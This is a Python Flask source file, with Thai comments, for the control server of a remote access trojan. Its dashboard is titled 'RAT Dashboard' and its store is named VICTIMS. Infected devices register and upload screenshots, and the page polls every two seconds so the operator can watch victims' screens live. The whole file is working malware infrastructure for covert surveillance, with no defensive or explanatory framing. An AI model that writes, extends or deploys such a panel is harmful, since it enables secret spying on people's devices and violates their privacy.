import os
import json
import time
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
VICTIMS = {} # เก็บข้อมูลและภาพ

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    device_id = data['device_id']
    VICTIMS[device_id] = {'info': data, 'last_seen': time.time(), 'screenshot': None}
    return jsonify({'status': 'ok'})

@app.route('/api/upload_screen', methods=['POST'])
def upload_screen():
    data = request.json
    device_id = data['device_id']
    image_base64 = data['image']
    if device_id in VICTIMS:
        VICTIMS[device_id]['screenshot'] = image_base64
        VICTIMS[device_id]['last_seen'] = time.time()
    return jsonify({'status': 'ok'})

@app.route('/api/victims')
def get_victims():
    return jsonify(list(VICTIMS.keys()))

@app.route('/api/view/<device_id>')
def view(device_id):
    if device_id in VICTIMS:
        return jsonify({'image': VICTIMS[device_id]['screenshot']})
    return jsonify({'error': 'Not found'})

DASHBOARD_HTML = """
<!DOCTYPE html>
<html><head><title>RAT Dashboard</title></head>
<body>
    <h1>เลือกดูหน้าจอ</h1>
    <select id="deviceSelect"></select>
    <button onclick="loadScreen()">ดูหน้าจอ</button>
    <br><img id="screenImage" style="max-width:100%; border:1px solid black;">
    <script>
        fetch('/api/victims').then(r=>r.json()).then(d=>{
            let sel = document.getElementById('deviceSelect');
            d.forEach(id=>{ let opt=document.createElement('option'); opt.value=id; opt.text=id; sel.appendChild(opt); })
        });
        function loadScreen() {
            let id = document.getElementById('deviceSelect').value;
            fetch('/api/view/'+id).then(r=>r.json()).then(d=>{
                if(d.image) document.getElementById('screenImage').src = 'data:image/png;base64,'+d.image;
            });
        }
        setInterval(loadScreen, 2000);
    </script>
</body></html>
"""

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)